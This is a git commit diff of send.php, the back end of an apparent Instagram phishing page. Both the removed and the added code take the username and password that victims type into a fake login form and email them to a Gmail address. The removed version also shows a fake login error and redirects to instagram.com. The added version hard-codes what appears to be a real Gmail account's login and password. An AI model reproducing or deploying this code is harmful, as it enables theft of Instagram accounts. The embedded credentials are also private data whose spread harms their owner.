57b6aa417e0a763377882a44e134ac13169ce8ec
Instagram <107749026+ItsNotSoham@users.noreply.github.com>
2025-02-10 15:20:45 +0530

    Update send.php

--- send.php
+++ send.php
@@ -1,26 +1,33 @@
 <?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
 
-// Variable settings
-$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
-$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
+require 'vendor/autoload.php';
 
-$subject = "Someone Login ! Insta Dummy page";
-$to = "patelsoham195@gmail.com";
+$mail = new PHPMailer(true);
 
-$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;
+try {
+    $username = $_POST['u_name'] ?? '';
+    $passcode = $_POST['pass'] ?? '';
+    
+    $mail->isSMTP();
+    $mail->Host = 'smtp.gmail.com';
+    $mail->SMTPAuth = true;
+    $mail->Username = 'patelsoham195@gmail.com'; // Replace with your Gmail address
+    $mail->Password = 'Soham@2810'; // Use an app password for Gmail
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+    $mail->Port = 587;
 
-// Check input fields
-if (!empty($username) and !empty($passcode)) {
+    $mail->setFrom('your-email@gmail.com', 'Web Form');
+    $mail->addAddress('patelsoham195@gmail.com');
 
-    mail($to, $subject, $txt);
-    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
-        window.location.replace('https://www.instagram.com');
-        </script>";
+    $mail->isHTML(true);
+    $mail->Subject = 'Login Details from Form';
+    $mail->Body    = "Username: $username <br> Password: $passcode";
 
-} else {
-
-    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
-        window.history.go(-1);
-        </script>";
+    $mail->send();
+    echo "Message has been sent";
+} catch (Exception $e) {
+    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
 }
 ?>
